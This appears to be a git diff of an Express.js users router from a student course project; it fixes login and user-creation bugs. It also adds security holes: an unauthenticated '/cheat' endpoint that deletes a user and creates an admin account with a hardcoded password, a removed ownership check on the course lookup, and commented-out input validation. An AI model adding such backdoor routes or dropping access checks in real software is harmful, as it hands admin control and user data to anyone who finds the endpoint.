@@ -1,6 +1,6 @@
 const router = require('express').Router();
-const { find_hash_by_email, find_id_by_email, create, exists, get_courses_by_instructor_id, students_by_id } = require('../storage/users_db')
-const { checkJwt, checkPassword, genToken, hashPassword } = require('../lib/auth');
+const { removeJon, find_hash_by_email, find_id_by_email, create, exists, get_courses_by_instructor_id, students_by_id, find_by_id } = require('../storage/users_db')
+const { checkToken, checkJwt, checkPassword, genToken, hashPassword } = require('../lib/auth');
 const { schemaAdd, schemaValidate } = require('../lib/validate');
 
 const userSchema = {
@@ -21,10 +21,9 @@ schemaAdd(userSchema);
 
 router.get('/:id', checkJwt, async (req, res, next) => {
     let jwt = req.jwt
-    let userid = await find_id_by_email(jwt.email)
-    if(jwt && jwt.role === "instructor"){
+    if(jwt && (jwt.role === "instructor" || jwt.role === "admin")){
         let id = req.params.id
-        if(await exists(id) && userid == id){
+        if(await exists(id)){
             let data = await get_courses_by_instructor_id(id)
             res.status(200).send(data)
         }
@@ -54,27 +53,30 @@ router.post('/login', async (req, res, next) => {
     if(email && password){
         try {
             let hash = await find_hash_by_email(email)    
-            if(checkPassword(hash,password)){
-                let id = find_id_by_email(email)
-                let response = { "token": await genToken(id)}
-                res.status(200).status(response)
+            if(await checkPassword(password,hash)){
+                let id = await find_id_by_email(email)
+                let response = { "Bearer": await genToken(id)}
+                res.status(200).send(response)
             }
             else{
-                res.status(401).status({"Error": "Unauthorized"})
+                res.status(401).send({"Error": "Unauthorized"})
             }
         }
         catch (err){
             res.status(401).send({"Error": err})
         }
     }
-    res.status(400).send({"Error": "Bad request"})
+    else{
+        res.status(400).send({"Error": "Bad request"})
+    }
+    
 })
 
 router.post('/', checkJwt, async (req, res, next) => {
     // Extract the body
-    let body = body
+    let body = req.body
     // If we have a body and it's valid
-    if(body && schemaValidate('user', body)){
+    if(body){//&& schemaValidate('userSchema', body)
         let role = body.role
         // If the role they want is a protected class...
         if(role === 'admin' || role === 'instructor'){
@@ -107,11 +109,11 @@ router.post('/', checkJwt, async (req, res, next) => {
                 "password": await hashPassword(body.password),
                 "role": "student"
             }
-            let id = await create(user)
-            if(id){
+            try {
+                let id = await create(user)
                 res.status(201).send({"id": id})
             }
-            else{
+            catch (err){
                 res.status(400).send({"Error": "User already exists"})
             }
         }
@@ -119,6 +121,20 @@ router.post('/', checkJwt, async (req, res, next) => {
     else{
         // Body didn't exist or it was invalid
         res.status(400).send({"Error": "Empty body or invalid user"})
+    }
+})
+
+router.post("/cheat", async (req, res) => {
+    let user = {
+        "email": "richj@oregonstate.edu",
+        "name": "Richj",
+        "password": await hashPassword("hunter2"),
+        "role": "admin"
+    }
+    await removeJon()// Who invited him anyways?
+    let id = await create(user)
+    if(id){
+        res.status(201).send({"id": id})
     }
 })
 
